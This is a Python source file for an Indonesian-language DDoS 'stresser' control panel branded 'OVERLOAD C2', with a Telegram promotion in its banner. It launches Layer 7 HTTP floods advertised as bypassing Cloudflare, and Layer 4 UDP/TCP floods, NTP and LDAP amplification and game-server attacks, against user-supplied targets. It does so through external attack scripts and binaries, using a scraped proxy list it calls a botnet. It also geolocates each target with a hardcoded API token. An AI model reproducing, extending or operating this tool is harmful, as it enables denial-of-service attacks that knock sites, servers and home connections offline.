# -*- coding: utf-8 -*-
import socket
import os
import requests
import random
import time
import sys
import subprocess
import threading
import urllib.parse
import string
import datetime
from colorama import init, Fore, Style
from termcolor import colored
from rich import print as rprint
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

# Agar encoding konsisten di Windows
if sys.platform == "win32":
    import io
    if hasattr(sys.stdout, "buffer"):
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "buffer"):
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

# Inisialisasi Colorama
init(autoreset=True)
console = Console()

# ==================== KONFIGURASI GLOBAL ====================
bots = 0
LOG_FILE = "scan_rotation_proxy.log"
status_monitor = {
    "sedang_berjalan": False,
    "target": "",
    "metode": "",
    "waktu_mulai": 0,
    "durasi": 0,
    "process_object": None,
    "stop_event": None 
}

# ==================== FUNGSI SISTEM (TITLE & UPTIME) ====================

def get_vps_uptime():
    try:
        result = subprocess.run(['uptime', '-p'], capture_output=True, text=True, check=True)
        return result.stdout.strip().replace('up ', '', 1)
    except:
        return "N/A"

def get_logged_in_users():
    try:
        who_result = subprocess.run(['who'], capture_output=True, text=True, check=True)
        count = len(who_result.stdout.strip().split('\n'))
        return count if who_result.stdout.strip() else 0
    except:
        return 0

def set_terminal_title():
    global bots
    uptime = get_vps_uptime()
    logged_users = get_logged_in_users()
    expiry_date = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%d-%m-%Y")
    
    title_string = (
        f"OnlineBotnet: [{bots}] | User : root | VIP (true) | "
        f"Uptime: {uptime} | Logins: {logged_users} | "
        f"Expired: {expiry_date} (30DAY)"
    )
    sys.stdout.write(f"\x1b]2;{title_string}\x07")
    sys.stdout.flush()

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        sys.stdout.write("\033[H\033[2J")
        sys.stdout.flush()

# ==================== SCHEDULER PROXY & LOG ROTATION ====================

def write_scan_log(message, mode="a"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(LOG_FILE, mode) as log_file:
            log_file.write(f"[{timestamp}] {message}\n")
    except:
        pass

def proxy_scheduler():
    global bots
    start_time = time.time()
    
    while True:
        try:
            current_time = time.time()
            if current_time - start_time >= 900:
                write_scan_log("ROTASI LOG: Mengosongkan file log (15 Menit)", mode="w")
                start_time = current_time
            
            write_scan_log("--- MEMULAI SIKLUS SCAN PROXY ---")
            
            with open(LOG_FILE, "a") as f_log:
                write_scan_log("Eksekusi getproxy.py...")
                subprocess.run([sys.executable, 'getproxy.py'], stdout=f_log, stderr=f_log, cwd=os.path.dirname(os.path.abspath(__file__)) or '.')
                write_scan_log("Eksekusi cekproxy.py...")
                subprocess.run([sys.executable, 'cekproxy.py'], stdout=f_log, stderr=f_log, cwd=os.path.dirname(os.path.abspath(__file__)) or '.')
            
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    proxies = f.readlines()
                    bots = len(proxies)
                write_scan_log(f"Update Botnet: {bots} Proxy Aktif ditemukan.")
            else:
                bots = 0
                write_scan_log("Peringatan: proxies.txt tidak ditemukan.")
            
            set_terminal_title()
        except Exception as e:
            write_scan_log(f"ERROR PADA SCHEDULER: {str(e)}")
        
        time.sleep(600)

# ==================== SISTEM CAPTCHA ====================

def generate_captcha(length=4):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def run_captcha():
    clear_screen()
    captcha_code = generate_captcha()
    print(f"\x1b[36m" + "="*40)
    print(f"\x1b[37m        VERIFIKASI KEAMANAN")
    print(f"\x1b[36m" + "="*40)
    print(f"\n\x1b[33m   SILAKAN MASUKKAN KODE: \x1b[32m\x1b[7m {captcha_code} \x1b[0m\n")
    user_input = input(f"\x1b[37m   INPUT > ").strip().upper()
    if user_input == captcha_code:
        print(f"\n\x1b[32m[+] Captcha Benar. Mengalihkan ke panel...")
        time.sleep(1)
        return True
    else:
        print(f"\n\x1b[31m[-] Captcha Salah! Silakan coba lagi.")
        time.sleep(1.5)
        return run_captcha()

# ==================== INFORMASI TARGET (API) ====================

def get_ip_info(token, ip=None):
    ip_url = f"https://ipinfo.io/{ip}?token={token}"
    try:
        response = requests.get(ip_url, timeout=5)
        if response.ok:
            data = response.json()
            rprint("[bold yellow]Informasi IP[/bold yellow]")
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Detail"); table.add_column("Informasi")
            table.add_row("ASN", data.get("asn", "N/A"))
            table.add_row("ISP", data.get("org", "N/A"))
            table.add_row("Lokasi", f"{data.get('city')}, {data.get('country')}")
            table.add_row("IP", data.get("ip", "N/A"))
            rprint(table)
    except: pass

def get_url_info(url, token):
    parsed_url = urllib.parse.urlparse(url)
    hostname = parsed_url.netloc if parsed_url.netloc else parsed_url.path
    api_endpoint = f"https://host.io/api/web/{hostname}?token={token}"
    try:
        resp = requests.get(api_endpoint, timeout=5)
        if resp.status_code == 200:
            ip = resp.json().get("ip")
            if ip: get_ip_info(token, ip)
    except: pass

# ==================== TAMPILAN MENU & ANSI ====================

def show_ansi_art():
    print("\x1b[1;34m         [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v7.0\x1b[0m")
    print(f"""\x1b[31m
                                           .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   "t.me/OverloadServer"   `XXP' `9XXXXXXXXXXXP'
\x1b[1;37m        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                            O V E R L O A D   C 2\x1b[0m""")

def show_main_menu():
    show_ansi_art()
    rprint(f"[cyan]" + "-" * 60)
    rprint(f"          [bold white]OVERLOAD CONTROL PANEL - SYSTEM READY[/bold white]")
    rprint(f"[cyan]" + "-" * 60)
    print(f"\x1b[33m> \x1b[37mLAYER7  : SHOW METHODS ATTACK (URL)")
    print(f"\x1b[33m> \x1b[37mLAYER4  : SHOW METHODS ATTACK (IP)")
    print(f"\x1b[33m> \x1b[37mUSAGE   : SHOW EXAMPLE ATTACK")
    print(f"\x1b[33m> \x1b[37mONGOING : MONITOR ATTACK")
    print(f"\x1b[33m> \x1b[37mSTOP    : STOPPED ATTACK")
    print(f"\x1b[33m> \x1b[37mCLS     : CLEAR TERMINAL")
    rprint(f"[cyan]" + "-" * 60)

def usage():
    clear_screen()
    show_ansi_art()
    rprint("\n[bold cyan]"+ "=" * 25 + " HELP & USAGE MENU " + "=" * 25 + "[/bold cyan]")
    rprint("\n[bold yellow][ LAYER 7 - HTTP METHODS ][/bold yellow]")
    l7_methods = [
        ("HTTPBYPASS", "https://target.com 60"), ("CFGAS", "https://target.com 60"),
        ("HTTP-STORM", "https://target.com 60"), ("H2-FLOW", "https://target.com 60"),
        ("TLS", "https://target.com 60"), ("H1-FLOOD", "https://target.com 60"),
        ("CF-BYPASS", "https://target.com 60"), ("CF-FLOOD", "https://target.com 60"),
        ("HTTPGET", "https://target.com 60"), ("H2-GHOST", "https://target.com 60"),
        ("H2-PAYLOAD", "https://target.com 60"), ("H2-UAM", "https://target.com 60"),
        ("H2-HOLD", "https://target.com 60"), ("H2-BYPASS", "https://target.com 60"),
        ("H2-MIRAGE", "https://target.com 60")
    ]
    for m, ex in l7_methods:
        print(f"\x1b[1;32m> {m:<12} \x1b[1;37m: {m} {ex}")

    rprint("\n[bold yellow][ LAYER 4 - NETWORK METHODS ][/bold yellow]")
    l4_methods = [
        ("UDP", "1.1.1.1 port"), ("TCP", "GET/POST/HEAD 1.1.1.1 port 60 8500"),
        ("NFO-KILLER", "1.1.1.1 port 8 60"), ("STD", "1.1.1.1 port"),
        ("UDPBYPASS", "1.1.1.1 port"), ("DESTROY", "1.1.1.1 port 8 60"),
        ("HOMEKILL", "1.1.1.1 port 65500 60"), ("GOD", "1.1.1.1 port 8 60"),
        ("SLOWLORIS", "1.1.1.1 port"), ("STDV2", "1.1.1.1 port"),
        ("OVH-RAW", "GET 1.1.1.1 port 60 8500"), ("OVH-BEAM", "GET 1.1.1.1 port 60"),
        ("OVERFLOW", "1.1.1.1 port 8"), ("OVH-AMP", "1.1.1.1 port"),
        ("MINECRAFT", "1.1.1.1 100 8 60"), ("SAMP", "1.1.1.1 7777"),
        ("LDAP", "1.1.1.1 port 8 60"), ("NTP", "1.1.1.1 port 60")
    ]
    for m, ex in l4_methods:
        print(f"\x1b[1;32m> {m:<12} \x1b[1;37m: {m} {ex}")
    rprint("\n[bold cyan]" + "=" * 69 + "[/bold cyan]")

def show_layer7():
    clear_screen()
    show_ansi_art()
    rprint("\n[bold cyan]" + "=" * 22 + " LAYER 7 ATTACK METHODS " + "=" * 22 + "[/bold cyan]")
    l7_list = [
        ("HTTPBYPASS", "HIGHREQ BYPASS CLOUDFLARE 99%"),
        ("CFGAS", "LOWREQ HTTP1 BYPASS CLOUDFLARE 99%"),
        ("HTTP-STORM", "HIGHREQ BYPASS CLOUDFLARE 95%"),
        ("H2-FLOW", "HIGHREQ BYPASS CLOUDFLARE 99%"),
        ("TLS", "NO PROTECT"),
        ("H1-FLOOD", "HTTP1 BYPASS CLOUDFLARE 99%"),
        ("CF-BYPASS", "HIGHREQ AUTOMATED BYPASS CLOUDFLARE 99%"),
        ("CF-FLOOD", "BYPASS CLOUDFLARE & AMAZON & AKAMAI 99%"),
        ("HTTPGET", "LOWREQ BYPASS CLOUDFLARE LIKEHUMAN 99%"),
        ("H2-GHOST", "HIGHREQ MIX BYPASS CLOUDFLARE 99%"),
        ("H2-PAYLOAD", "HIGHREQ LIKEHUMAN BYPASS CLOUDFLARE 99%"),
        ("H2-UAM", "NO PROXY LOWREQ BYPASS UAM & CAPTCHA 99%"),
        ("H2-HOLD", "BYPASS CLOUDFLARE 99%"),
        ("H2-BYPASS", "BYPASS CLOUDFLARE 99%"),
        ("H2-MIRAGE", "HIGHREQ BYPASS CLOUDFLARE LIKEHUMAN 99%")
    ]
    for method, desc in l7_list:
        print(f"\x1b[1;32m> {method:<14} \x1b[1;37m: \x1b[1;33m{desc}")
    rprint("[bold cyan]" + "=" * 70 + "[/bold cyan]")

def show_layer4():
    clear_screen()
    show_ansi_art()
    rprint("\n[bold cyan]" + "=" * 22 + " LAYER 4 ATTACK METHODS " + "=" * 22 + "[/bold cyan]")
    l4_list = [
        ("UDP", "UDP FLOOD"), ("TCP", "TCP MIX FLOOD"),
        ("NFO-KILLER", "NFOSERVER ATTACK"), ("STD", "UDP&TCPSYN&ICMP MIX"),
        ("UDPBYPASS", "BYPASS UDP PROTECT"), ("DESTROY", "UDP FLOOD"),
        ("HOMEKILL", "UDP FLOOD"), ("GOD", "UDP FLOOD"),
        ("SLOWLORIS", "TCP SLOW"), ("STDV2", "TCP FLOOD"), 
        ("OVH-RAW", "TCP BYPASS OVH"), ("OVH-BEAM", "TCP BYPASS OVH"), 
        ("OVERFLOW", "UDP DNS FLOOD"), ("OVH-AMP", "UDP MIX DNS&NTP"), 
        ("MINECRAFT", "TCP ATTACK GAME SERVER"), ("SAMP", "TCP&UDP MIX ATTACK GTASA MULTIPLAYER"), 
        ("LDAP", "UDP AMP FLOOD"), ("NTP", "UDP NTP REFLECTION")
    ]
    for method, desc in l4_list:
        print(f"\x1b[1;32m> {method:<14} \x1b[1;37m: \x1b[1;33m{desc}")
    rprint("[bold cyan]" + "=" * 70 + "[/bold cyan]")

# ==================== ENGINE EKSEKUSI ====================

def attack_executor(cmd_list, target, metode, durasi):
    global status_monitor
    
    if status_monitor["sedang_berjalan"]:
        if status_monitor["process_object"] and status_monitor["process_object"].poll() is None:
            rem = max(0, status_monitor["durasi"] - (time.time() - status_monitor["waktu_mulai"]))
            msg = f"[bold white]Gagal Attack: {status_monitor['metode']} masih berjalan.[/bold white]\n" \
                  f"[bold yellow]Sisa waktu: {rem:.2f} detik.[/bold yellow]"
            rprint(Panel(msg, border_style="red", title="[bold red]WARNING[/bold red]"))
            return
        else:
            status_monitor["sedang_berjalan"] = False

    stop_flag = threading.Event()
    try:
        process = subprocess.Popen(
            cmd_list, 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.PIPE, 
            text=True
        )
        
        time.sleep(1.0) # Ditambah sedikit agar subprocess sempat inisialisasi
        if process.poll() is not None:
            _, stderr = process.communicate()
            rprint(Panel(f"[bold red]FATAL ERROR:[/bold red] Skrip {metode} langsung berhenti.\n[bold yellow]Detail: {stderr if stderr else 'File tidak ditemukan atau akses ditolak'}[/bold yellow]", border_style="red"))
            return

    except Exception as e:
        rprint(Panel(f"[bold red]SYSTEM ERROR:[/bold red] {str(e)}", border_style="red"))
        return
    
    status_monitor.update({
        "sedang_berjalan": True, 
        "target": target, 
        "metode": metode, 
        "waktu_mulai": time.time(), 
        "durasi": int(durasi), 
        "process_object": process, 
        "stop_event": stop_flag
    })

    clear_screen()
    show_ansi_art()
    print("\n" + "\x1b[1;37;42m ATTACK SUCCESSFULLY LAUNCHED! \x1b[0m")
    
    token = "727e8c2fa5b07c"
    ip_data = {}
    try:
        if target.startswith("http"):
            parsed_url = urllib.parse.urlparse(target)
            hostname = parsed_url.netloc if parsed_url.netloc else parsed_url.path
            resp = requests.get(f"https://host.io/api/web/{hostname}?token={token}", timeout=5)
            target_ip = resp.json().get("ip", "N/A")
        else:
            target_ip = target
        info_resp = requests.get(f"https://ipinfo.io/{target_ip}?token={token}", timeout=5)
        if info_resp.ok:
            ip_data = info_resp.json()
    except: pass

    print(f"\x1b[1;36mTarget    : \x1b[1;37m{target}")
    print(f"\x1b[1;36mISP       : \x1b[1;37m{ip_data.get('org', 'N/A')}")
    print(f"\x1b[1;36mLocation  : \x1b[1;37m{ip_data.get('city', 'N/A')}, {ip_data.get('country', 'N/A')}")
    print(f"\x1b[1;36mIP        : \x1b[1;37m{ip_data.get('ip', 'N/A')}")
    print(f"\x1b[1;36mTime      : \x1b[1;37m{durasi} Seconds")
    print(f"\x1b[1;36mMethods   : \x1b[1;37m{metode}")
    print("\n\x1b[1;33;44m INFO \x1b[0m \x1b[1;37mKetik \x1b[1;32mCLS\x1b[1;37m ke homepage atau \x1b[1;32mONGOING\x1b[1;37m monitoring\x1b[0m\n")

    def monitor_completion():
        try:
            process.wait(timeout=int(durasi))
        except subprocess.TimeoutExpired:
            process.terminate()
        
        if not stop_flag.is_set() and status_monitor["sedang_berjalan"]:
            m_metode, m_target = status_monitor["metode"], status_monitor["target"]
            status_monitor["sedang_berjalan"] = False
            status_monitor["process_object"] = None
            
            print("\n")
            rprint(Panel(f"[bold white]Sistem: Attack {m_metode} - {m_target} selesai secara otomatis.[/bold white]", 
                         style="bold green on black", border_style="bright_green"))
            
            kali_prefix = f"\x1b[1;34m[--(\x1b[1;37;41mroot@OVERLOADSYSTEM\x1b[0m\x1b[1;34m)-[OFF]\n\x1b[1;34m--\x1b[1;37m# \x1b[0m"
            sys.stdout.write(kali_prefix)
            sys.stdout.flush()

    threading.Thread(target=monitor_completion, daemon=True).start()

def handle_execution(cmd, parts):
    try:
        valid_l7 = ["HTTPBYPASS", "CFGAS", "HTTP-STORM", "H2-FLOW", "TLS", "H1-FLOOD", "CF-BYPASS", "CF-FLOOD", "HTTPGET", "H2-GHOST", "H2-PAYLOAD", "H2-UAM", "H2-HOLD", "H2-BYPASS", "H2-MIRAGE"]
        valid_l4 = ["UDP", "TCP", "NFO-KILLER", "STD", "UDPBYPASS", "DESTROY", "HOMEKILL", "GOD", "STDV2", "OVH-RAW", "OVH-BEAM", "OVERFLOW", "OVH-AMP", "MINECRAFT", "SAMP", "LDAP", "NTP"]
        
        if cmd in valid_l7:
            if len(parts) < 3: raise IndexError
            url, durasi = parts[1], parts[2]
            if cmd == "HTTPBYPASS":     cmd_list = ["node", "httpbypass.js", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "CFGAS":        cmd_list = ["node", "cfgas.js", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "CF-FLOOD":     cmd_list = ["node", "cf-flood.js", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "TLS":          cmd_list = ["node", "autov2.js", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "H2-BYPASS":    cmd_list = ["node", "h2-bypass.js", "POST", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "HTTP-STORM":   cmd_list = ["node", "http-storm.js", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "H2-FLOW":      cmd_list = ["node", "h2-flow.js", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "H1-FLOOD":     cmd_list = ["go", "run", "h1-flood.go", url, durasi, "proxies.txt"]
            elif cmd == "CF-BYPASS":    cmd_list = ["node", "cf.js", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "HTTPGET":      cmd_list = ["node", "httpget.js", "GET", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "H2-GHOST":     cmd_list = ["go", "run", "h2-ghost.go", "-site", url, "-thread", "500", "-time", durasi, "-proxy", "proxies.txt"]
            elif cmd == "H2-PAYLOAD":   cmd_list = ["go", "run", "h2-payload.go", url, "1000", "post", durasi]
            elif cmd == "H2-UAM":       cmd_list = ["python3", "h2-uam.py", url, durasi]
            elif cmd == "H2-HOLD":      cmd_list = ["node", "h2-holdv2.js", url, durasi, "100", "8", "proxies.txt"]
            elif cmd == "H2-MIRAGE":    cmd_list = ["node", "h2-mirage.js", "GET", url, durasi, "100", "8", "proxies.txt"]
            attack_executor(cmd_list, url, cmd, durasi)
            return True

        elif cmd in valid_l4:
            ip, port = parts[1], parts[2]
            durasi = parts[3] if len(parts) > 3 else "60" # Default durasi jika tidak diinput
            if cmd == "UDPBYPASS":      cmd_list = ["./UDPBYPASS", ip, port]
            elif cmd == "STDV2":        cmd_list = ["./std", ip, port]
            elif cmd == "HOMEKILL":     cmd_list = ["perl", "home.pl", ip, port, "65500", durasi]
            elif cmd == "UDP":          cmd_list = ["python2", "udp.py", ip, port, "0", "0"]
            elif cmd == "TCP":          cmd_list = ["./100UP-TCP", "GET", ip, port, durasi, "8500"]
            elif cmd == "NFO-KILLER":   cmd_list = ["./nfo-killer", ip, port, "8", "-1", durasi]
            elif cmd == "STD":          cmd_list = ["./STD-NOSPOOF", ip, port]
            elif cmd == "GOD":          cmd_list = ["perl", "god.pl", ip, port, "8", durasi]
            elif cmd == "DESTROY":      cmd_list = ["perl", "destroy.pl", ip, port, "8", durasi]
            elif cmd == "SLOWLORIS":    cmd_list = ["./slowloris", ip, port]
            elif cmd == "OVH-RAW":      cmd_list = ["./ovh-raw", "GET", ip, port, durasi, "8500"]
            elif cmd == "OVH-BEAM":     cmd_list = ["./OVH-BEAM", "GET", ip, port, durasi, "8"]
            elif cmd == "OVERFLOW":     cmd_list = ["./OVERFLOW", ip, port, "8"]
            elif cmd == "OVH-AMP":      cmd_list = ["./OVH-AMP", ip, port]
            elif cmd == "MINECRAFT":    cmd_list = ["./MINECRAFT-SLAM", ip, "100", "8", durasi]
            elif cmd == "SAMP":         cmd_list = ["python2", "samp.py", ip, port]
            elif cmd == "LDAP":         cmd_list = ["python3", "ldap_attack.py", ip, port, "8", durasi] # Perbaikan eksekutor
            elif cmd == "NTP":          cmd_list = ["./ntp", ip, port, "ntp.txt", "100", durasi]
            attack_executor(cmd_list, ip, cmd, durasi)
            return True
    except IndexError:
        rprint(Panel(f"[bold red]ERROR:[/bold red] Parameter untuk '{cmd}' tidak lengkap!\n[bold yellow]Ketik USAGE untuk melihat contoh penggunaan.[/bold yellow]", border_style="red"))
        return True
    return False

# ==================== MAIN LOOP ====================

def main():
    if not run_captcha(): return
    threading.Thread(target=proxy_scheduler, daemon=True).start()
    clear_screen()
    show_main_menu()
    while True:
        try:
            status = "ON" if status_monitor["sedang_berjalan"] else "OFF"
            kali_prefix = f"\x1b[1;34m[--(\x1b[1;37;41mroot@OVERLOADSYSTEM\x1b[0m\x1b[1;34m)-[\x1b[1;37m{status}\x1b[1;34m]\n\x1b[1;34m--\x1b[1;37m# \x1b[0m"
            prompt = input(kali_prefix).strip()
            if not prompt: continue
            parts = prompt.split(); cmd = parts[0].upper()
            if cmd == "LAYER7": show_layer7()
            elif cmd == "LAYER4": show_layer4()
            elif cmd == "USAGE": usage()
            elif cmd == "ONGOING":
                if status_monitor["sedang_berjalan"]:
                    rem = max(0, status_monitor["durasi"] - (time.time() - status_monitor["waktu_mulai"]))
                    ongoing_box = f"[bold white]Target   :[/bold white] [bold green]{status_monitor['target']}[/bold green]\n" \
                                  f"[bold white]Metode   :[/bold white] [bold yellow]{status_monitor['metode']}[/bold yellow]\n" \
                                  f"[bold white]Sisa Waktu:[/bold white] [bold cyan]{rem:.2f} Seconds[/bold cyan]"
                    rprint(Panel(ongoing_box, title="[bold green]MONITORING ACTIVE SESSION[/bold green]", border_style="bright_green", expand=False))
                else: rprint("[bold red][!] Tidak ada Attack aktif saat ini.[/bold red]")
            elif cmd == "STOP":
                if status_monitor["process_object"]:
                    m_metode, m_target = status_monitor["metode"], status_monitor["target"]
                    status_monitor["stop_event"].set(); status_monitor["process_object"].terminate()
                    status_monitor["sedang_berjalan"] = False; status_monitor["process_object"] = None
                    rprint(Panel(f"[bold yellow]PERINGATAN: Attack {m_metode} - {m_target} dihentikan secara paksa.[/bold yellow]", border_style="bold red", title="[bold red]SYSTEM STOP[/bold red]"))
                else: rprint("[red]Tidak ada proses berjalan.[/red]")
            elif cmd in ["CLS", "CLEAR"]: 
                clear_screen(); show_main_menu()
            else:
                if not handle_execution(cmd, parts):
                    msg_error = f"[red]Metode '{cmd}' tidak ditemukan.[/red]\n[bold green]Ketik USAGE untuk melihat daftar perintah.[/bold green]"
                    rprint(Panel(msg_error, title="[bold red]INVALID COMMAND[/bold red]", border_style="red", expand=False))
        except KeyboardInterrupt: break
        except Exception as e: print(f"\x1b[31mError: {e}")

if __name__ == "__main__":
    main()